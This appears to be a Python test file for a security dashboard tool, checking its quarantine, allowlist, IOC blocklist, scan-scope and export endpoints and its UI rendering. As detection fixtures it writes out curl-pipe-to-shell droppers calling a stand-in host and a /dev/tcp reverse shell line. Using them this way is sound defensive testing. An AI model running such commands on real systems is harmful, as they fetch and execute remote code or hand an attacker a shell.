"""Comprehensive real-engine HTTP E2E, security, concurrency, and Node DOM tests for remediation & UI features."""
from __future__ import annotations

import hashlib
import http.client
import json
import os
from pathlib import Path
import re
import shutil
import subprocess
import tempfile
import threading
import unittest

from custodian.dashboard_auth import DashboardAuth
from custodian.engine import Engine
from custodian.web import make_server


class LiveRemediationHttpTests(unittest.TestCase):
    """Real Engine + real DashboardAuth + real loopback CustodianDashboardServer E2E tests."""

    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory(dir=os.environ.get("TMPDIR"))
        self.root = Path(self._tmp.name)
        self.scope = self.root / "watched"
        self.scope.mkdir()
        self.outside = self.root / "outside"
        self.outside.mkdir()
        self.state_dir = self.root / "state"

        self.engine = Engine(self.state_dir)
        self.engine.setup({"watched_paths": [str(self.scope)], "use_system_av": False})
        # Avoid slow live softwareupdate / Windows Update COM queries during HTTP export tests
        self.engine.updates = lambda: {"status": "ok", "packages": [], "upgradable_count": 0}  # type: ignore[method-assign]

        self.auth = DashboardAuth(self.state_dir)
        self.auth.configure("tester", "super-long-passphrase-2026")

        self.srv = make_server(self.engine, host="127.0.0.1", port=0, auth=self.auth)
        self.thread = threading.Thread(target=self.srv.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True)
        self.thread.start()
        self.cookie = self._login()

    def tearDown(self) -> None:
        self.srv.shutdown()
        self.srv.server_close()
        self.thread.join(timeout=2)
        self._tmp.cleanup()

    def _login(self) -> str:
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.bound_port, timeout=10)
        body = json.dumps({"username": "tester", "password": "super-long-passphrase-2026"}).encode("utf-8")
        conn.request(
            "POST",
            "/api/session",
            body=body,
            headers={
                "Host": f"127.0.0.1:{self.srv.bound_port}",
                "Origin": self.srv.base_url,
                "Content-Type": "application/json",
            },
        )
        resp = conn.getresponse()
        resp.read()
        self.assertEqual(resp.status, 200)
        return (resp.getheader("Set-Cookie") or "").split(";", 1)[0]

    def _req(
        self,
        method: str,
        path: str,
        body: dict | None = None,
        *,
        with_auth: bool = True,
        with_origin: bool = True,
    ) -> tuple[int, dict, http.client.HTTPMessage]:
        conn = http.client.HTTPConnection("127.0.0.1", self.srv.bound_port, timeout=10)
        headers = {"Host": f"127.0.0.1:{self.srv.bound_port}"}
        if with_auth:
            headers["Cookie"] = self.cookie
        if with_origin:
            headers["Origin"] = self.srv.base_url
        raw = None
        if body is not None:
            headers["Content-Type"] = "application/json"
            raw = json.dumps(body).encode("utf-8")
        conn.request(method, path, body=raw, headers=headers)
        resp = conn.getresponse()
        raw_resp = resp.read().decode("utf-8")
        parsed = json.loads(raw_resp) if (resp.getheader("Content-Type") or "").startswith("application/json") else {"raw": raw_resp}
        return resp.status, parsed, resp.headers

    def test_all_new_post_endpoints_enforce_origin_and_auth(self) -> None:
        routes = [
            ("/api/actions/scan-target", {"path": str(self.scope)}),
            ("/api/actions/scope", {"action": "add_exclusion", "value": "*.tmp"}),
            ("/api/actions/quarantine", {"action": "quarantine", "path": str(self.scope / "x.sh")}),
            ("/api/actions/allowlist", {"action": "add", "path": str(self.scope / "x.sh")}),
            ("/api/actions/ioc", {"action": "add", "sha256": "a" * 64}),
        ]
        for route, payload in routes:
            with self.subTest(route=route, check="no_origin"):
                code, _, _ = self._req("POST", route, payload, with_origin=False)
                self.assertEqual(code, 403)
            with self.subTest(route=route, check="no_auth"):
                code, _, _ = self._req("POST", route, payload, with_auth=False)
                self.assertEqual(code, 401)

    def test_full_quarantine_restore_delete_and_safety_boundaries_via_http(self) -> None:
        evil = self.scope / "payload.sh"
        evil.write_text("#!/bin/sh\ncurl -fsSL https://bad.example/p.sh | bash\n")
        if os.name != "nt":
            evil.chmod(0o755)
        secret = self.scope / ".env"
        secret.write_text("API_KEY=do-not-touch\n")
        out_file = self.outside / "outside.sh"
        out_file.write_text("#!/bin/sh\ncurl https://bad.example/x | sh\n")

        # Scan finds evil
        code, scan_res, _ = self._req("POST", "/api/actions/scan", {})
        self.assertEqual(code, 200)
        self.assertTrue(any(f["path"] == str(evil) for f in scan_res["scan"]["findings"]))

        # Reject quarantining sensitive .env, outside file, or state_dir
        for bad_path in (str(secret), str(out_file), str(self.state_dir / "settings.json"), "/etc/passwd"):
            c_bad, r_bad, _ = self._req("POST", "/api/actions/quarantine", {"action": "quarantine", "path": bad_path})
            self.assertEqual(c_bad, 400, f"Should reject {bad_path}: {r_bad}")

        # Quarantine evil
        c_q, r_q, _ = self._req("POST", "/api/actions/quarantine", {"action": "quarantine", "path": str(evil), "reason": "Dropper"})
        self.assertEqual(c_q, 200)
        self.assertTrue(r_q["ok"])
        qid = r_q["item"]["id"]
        self.assertFalse(evil.exists())

        # Verify quarantined payload is 0600 (non-executable) on POSIX
        q_bin = self.state_dir / "quarantine" / f"{qid}.bin"
        self.assertTrue(q_bin.is_file())
        if os.name != "nt":
            self.assertEqual(q_bin.stat().st_mode & 0o777, 0o600)

        # GET /api/quarantine lists it
        c_list, r_list, _ = self._req("GET", "/api/quarantine")
        self.assertEqual(c_list, 200)
        self.assertEqual(len(r_list["items"]), 1)
        self.assertEqual(r_list["items"][0]["id"], qid)

        # Refuse restore if destination file already exists
        evil.write_text("replacement")
        c_dup, _, _ = self._req("POST", "/api/actions/quarantine", {"action": "restore", "id": qid})
        self.assertEqual(c_dup, 400)
        evil.unlink()

        # Restore cleanly
        c_res, r_res, _ = self._req("POST", "/api/actions/quarantine", {"action": "restore", "id": qid})
        self.assertEqual(c_res, 200)
        self.assertTrue(r_res["ok"])
        self.assertTrue(evil.exists())
        self.assertFalse(q_bin.exists())

        # Re-quarantine and delete permanently
        _, r_q2, _ = self._req("POST", "/api/actions/quarantine", {"action": "quarantine", "path": str(evil)})
        qid2 = r_q2["item"]["id"]
        c_del, r_del, _ = self._req("POST", "/api/actions/quarantine", {"action": "delete", "id": qid2})
        self.assertEqual(c_del, 200)
        self.assertTrue(r_del["ok"])
        self.assertFalse((self.state_dir / "quarantine" / f"{qid2}.bin").exists())
        _, r_list2, _ = self._req("GET", "/api/quarantine")
        self.assertEqual(r_list2["items"], [])

    def test_allowlist_ioc_custom_scan_scope_and_export_via_http(self) -> None:
        # 1. Custom on-demand target scan (outside watched scope is allowed for ad-hoc scan, sensitive blocked)
        ad_hoc_bad = self.outside / "rev.sh"
        ad_hoc_bad.write_text("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
        c_st, r_st, _ = self._req("POST", "/api/actions/scan-target", {"path": str(ad_hoc_bad)})
        self.assertEqual(c_st, 200)
        self.assertEqual(r_st["files_checked"], 1)
        self.assertTrue(any(f["category"] == "reverse_shell" for f in r_st["findings"]))

        c_st_dir, r_st_dir, _ = self._req("POST", "/api/actions/scan-target", {"path": str(self.outside)})
        self.assertEqual(c_st_dir, 200)
        self.assertEqual(r_st_dir["kind"], "directory")
        self.assertTrue(any(f["path"] == str(ad_hoc_bad) for f in r_st_dir["findings"]))

        # Sensitive path rejected for ad-hoc scan
        env_out = self.outside / ".env"
        env_out.write_text("SECRET=1\n")
        c_st_env, _, _ = self._req("POST", "/api/actions/scan-target", {"path": str(env_out)})
        self.assertEqual(c_st_env, 400)

        # 2. Custom IOC blocklist via HTTP
        blob = self.scope / "known_bad.dat"
        blob.write_bytes(b"ioc-http-test-bytes-9876")
        digest = hashlib.sha256(b"ioc-http-test-bytes-9876").hexdigest()
        c_bad_ioc, _, _ = self._req("POST", "/api/actions/ioc", {"action": "add", "sha256": "not-a-hash"})
        self.assertEqual(c_bad_ioc, 400)

        c_add_ioc, r_add_ioc, _ = self._req("POST", "/api/actions/ioc", {"action": "add", "sha256": digest, "description": "Test IOC"})
        self.assertEqual(c_add_ioc, 200)
        self.assertEqual(r_add_ioc["entry"]["sha256"], digest)

        _, r_iocs, _ = self._req("GET", "/api/ioc")
        self.assertTrue(any(h["sha256"] == digest and not h["builtin"] for h in r_iocs["hashes"]))

        _, r_scan_ioc, _ = self._req("POST", "/api/actions/scan", {})
        ioc_hits = [f for f in r_scan_ioc["scan"]["findings"] if f["category"] == "ioc_hash" and f["path"] == str(blob)]
        self.assertEqual(len(ioc_hits), 1)

        # 3. Allowlist suppresses that IOC finding, then removing re-enables it
        c_al, r_al, _ = self._req("POST", "/api/actions/allowlist", {"action": "add", "finding_id": ioc_hits[0]["id"], "path": str(blob), "reason": "FP"})
        self.assertEqual(c_al, 200)
        al_id = r_al["entry"]["id"]

        _, r_scan_al, _ = self._req("POST", "/api/actions/scan", {})
        self.assertFalse(any(f["path"] == str(blob) for f in r_scan_al["scan"]["findings"]))

        c_al_rm, _, _ = self._req("POST", "/api/actions/allowlist", {"action": "remove", "id": al_id})
        self.assertEqual(c_al_rm, 200)

        # Built-in EICAR hash cannot be removed
        eicar_sha = hashlib.sha256(b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + b"EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").hexdigest()
        c_rm_bi, _, _ = self._req("POST", "/api/actions/ioc", {"action": "remove", "sha256": eicar_sha})
        self.assertEqual(c_rm_bi, 400)
        c_rm_ioc, _, _ = self._req("POST", "/api/actions/ioc", {"action": "remove", "sha256": digest})
        self.assertEqual(c_rm_ioc, 200)

        # 4. Scope management via HTTP
        c_sc_bad, _, _ = self._req("POST", "/api/actions/scope", {"action": "remove_path", "value": str(self.scope)})
        self.assertEqual(c_sc_bad, 400)  # cannot remove last scope
        c_sc_add, r_sc_add, _ = self._req("POST", "/api/actions/scope", {"action": "add_path", "value": str(self.outside)})
        self.assertEqual(c_sc_add, 200)
        self.assertIn(str(self.outside), r_sc_add["settings"]["watched_paths"])
        c_sc_rm, r_sc_rm, _ = self._req("POST", "/api/actions/scope", {"action": "remove_path", "value": str(self.outside)})
        self.assertEqual(c_sc_rm, 200)
        self.assertNotIn(str(self.outside), r_sc_rm["settings"]["watched_paths"])

        # 5. JSON & CSV export
        c_exp_j, r_exp_j, hdr_j = self._req("GET", "/api/export?format=json")
        self.assertEqual(c_exp_j, 200)
        self.assertIn("attachment; filename=\"warden-report-", hdr_j.get("Content-Disposition") or "")
        self.assertIn("findings", r_exp_j)

        c_exp_c, r_exp_c, hdr_c = self._req("GET", "/api/export?format=csv")
        self.assertEqual(c_exp_c, 200)
        self.assertIn("text/csv", hdr_c.get("Content-Type") or "")
        self.assertIn("id,severity,category,status", r_exp_c["raw"])

    def test_action_lock_returns_409_conflict_when_busy(self) -> None:
        self.assertTrue(self.srv._action_lock.acquire(blocking=False))
        try:
            code, body, _ = self._req("POST", "/api/actions/scan", {})
            self.assertEqual(code, 409)
            self.assertEqual(body["error"], "busy")
        finally:
            self.srv._action_lock.release()


class DashboardDomUiTests(unittest.TestCase):
    """Static HTML/JS integrity and Node.js VM DOM verification for all new UI features."""

    def test_no_duplicate_ids_and_all_js_ids_exist_in_html(self) -> None:
        repo = Path(__file__).resolve().parents[2]
        html = (repo / "dashboard" / "index.html").read_text(encoding="utf-8")
        js = (repo / "dashboard" / "app.js").read_text(encoding="utf-8")

        html_ids = re.findall(r'\bid="([^"]+)"', html)
        seen: set[str] = set()
        duplicates = [i for i in html_ids if i in seen or seen.add(i)]  # type: ignore[func-returns-value]
        self.assertEqual(duplicates, [], f"Duplicate HTML IDs found: {duplicates}")

        js_ids = set(re.findall(r'getElementById\(\s*["\']([^"\']+)["\']\s*\)', js))
        missing = sorted(js_ids - seen)
        self.assertEqual(missing, [], f"IDs referenced in app.js but missing from index.html: {missing}")

    @unittest.skipIf(shutil.which("node") is None, "node not installed")
    def test_node_vm_verifies_category_filter_apps_pagination_and_theme(self) -> None:
        repo = Path(__file__).resolve().parents[2]
        app_js = repo / "dashboard" / "app.js"
        with tempfile.TemporaryDirectory(dir=os.environ.get("TMPDIR")) as td:
            harness = Path(td) / "ui_test.mjs"
            harness.write_text(
                f"""
import assert from 'node:assert/strict';
import fs from 'node:fs';
import vm from 'node:vm';

const code = fs.readFileSync({json.dumps(str(app_js))}, 'utf8');
const elements = new Map();
function makeNode(tag='div') {{
  const children = [];
  const classes = new Set();
  const attrs = new Map();
  return {{
    tagName: tag.toUpperCase(),
    textContent: '',
    value: '',
    disabled: false,
    checked: false,
    title: '',
    style: {{}},
    children,
    get firstChild() {{ return children[0] || null; }},
    appendChild(c) {{ children.push(c); return c; }},
    removeChild(c) {{ const i = children.indexOf(c); if (i >= 0) children.splice(i, 1); return c; }},
    addEventListener() {{}},
    setAttribute(k, v) {{ attrs.set(k, String(v)); }},
    getAttribute(k) {{ return attrs.get(k) ?? null; }},
    removeAttribute(k) {{ attrs.delete(k); }},
    scrollIntoView() {{}},
    classList: {{
      add(...xs) {{ xs.forEach(x => classes.add(x)); }},
      remove(...xs) {{ xs.forEach(x => classes.delete(x)); }},
      toggle(x, force) {{ if (force === undefined) {{ classes.has(x) ? classes.delete(x) : classes.add(x); }} else if (force) classes.add(x); else classes.delete(x); }},
      contains(x) {{ return classes.has(x); }},
    }},
  }};
}}
const doc = {{
  documentElement: makeNode('html'),
  getElementById(id) {{ if (!elements.has(id)) elements.set(id, makeNode('div')); return elements.get(id); }},
  querySelectorAll() {{ return []; }},
  createElement(tag) {{ return makeNode(tag); }},
  createTextNode(t) {{ return {{ textContent: String(t) }}; }},
  addEventListener() {{}},
}};

const sandbox = {{ CustodianUI: {{}}, document: doc, window: {{}}, console, setTimeout, clearTimeout }};
vm.createContext(sandbox);
vm.runInContext(code, sandbox);

const ui = sandbox.CustodianUI;
// 1. Test category filtering + critical severity + out_of_scope resolved count
const snap = ui.fromSnapshot({{
  status: {{ configured: true, monitoring: true, last_scan: {{ complete: true, files_checked: 10, finished_at: '2026-11-22T00:00:00Z' }} }},
  coverage_summary: {{ state: 'complete', complete: true, files_checked: 10, max_files: 100 }},
  settings: {{ watched_paths: ['/tmp/a'], exclusions: [], max_files: 100, check_permissions: false, security_scan: true, use_system_av: false }},
  av_status: {{ available: true, label: 'ClamAV (clamscan)', security_scan_enabled: true, use_system_av: false, check_permissions: false }},
  findings: [
    {{ id: 'f1', severity: 'critical', category: 'reverse_shell', status: 'open', title: 'Reverse shell', path: '/tmp/a/r.sh', evidence: {{ rule: 'reverse_shell_dev_tcp' }} }},
    {{ id: 'f2', severity: 'medium', category: 'permissions', status: 'out_of_scope', title: 'Perm', path: '/tmp/a/.env', evidence: {{}} }},
    {{ id: 'f3', severity: 'high', category: 'dropper', status: 'resolved', title: 'Dropper', path: '/tmp/a/d.sh', evidence: {{}} }},
  ],
  events: [],
  inventory: {{ discovery_approved: false, profiles: [] }},
  updates: {{ status: 'ok', packages: [] }},
}});

ui.renderOverview(snap);
assert.equal(doc.getElementById('fact-av-val').textContent, 'Active (Built-in)');

ui.state.categoryFilter = 'reverse_shell';
ui.renderFindings(snap);
assert.equal(doc.getElementById('findings-tbody').children.length, 1);

// 2. Test renderApps with 250 OS apps -> shows 200 and exposes truncation notice
const manyApps = Array.from({{ length: 250 }}, (_, i) => ({{
  name: 'pkg-' + i, manager: 'apt', installed_version: '1.0', update_available: false,
}}));
ui.state.appsData = {{
  discovery_approved: true,
  hermes_plugins: [{{ id: 'plug-a', name: 'Plugin A', version: '1.0', source: 'git', enabled: true, updatable: true }}],
  mcp_servers: [],
  os_apps: manyApps,
  summary: {{ plugins_count: 1, mcp_count: 0, os_apps_count: 250, updatable_count: 0 }},
}};
ui.renderApps();
assert.equal(doc.getElementById('apps-os-tbody').children.length, 200);
assert.equal(doc.getElementById('apps-os-truncation').classList.contains('is-hidden'), false);
assert.ok(doc.getElementById('apps-os-truncation-text').textContent.includes('200 of 250'));

// 3. Test showAppsActionBanner uses is-warn for warn tone
ui.showAppsActionBanner('Admin needed', 'Run sudo', 'sudo apt-get upgrade', 'warn');
assert.equal(doc.getElementById('apps-action-banner').classList.contains('is-warn'), true);
assert.equal(doc.getElementById('apps-action-banner').classList.contains('is-success'), false);
console.log('REMEDIATION_DOM_OK');
""",
                encoding="utf-8",
            )
            proc = subprocess.run(["node", str(harness)], capture_output=True, text=True, timeout=15, check=False)
            self.assertEqual(proc.returncode, 0, msg=f"STDOUT:\n{proc.stdout}\nSTDERR:\n{proc.stderr}")
            self.assertIn("REMEDIATION_DOM_OK", proc.stdout)


if __name__ == "__main__":
    unittest.main()
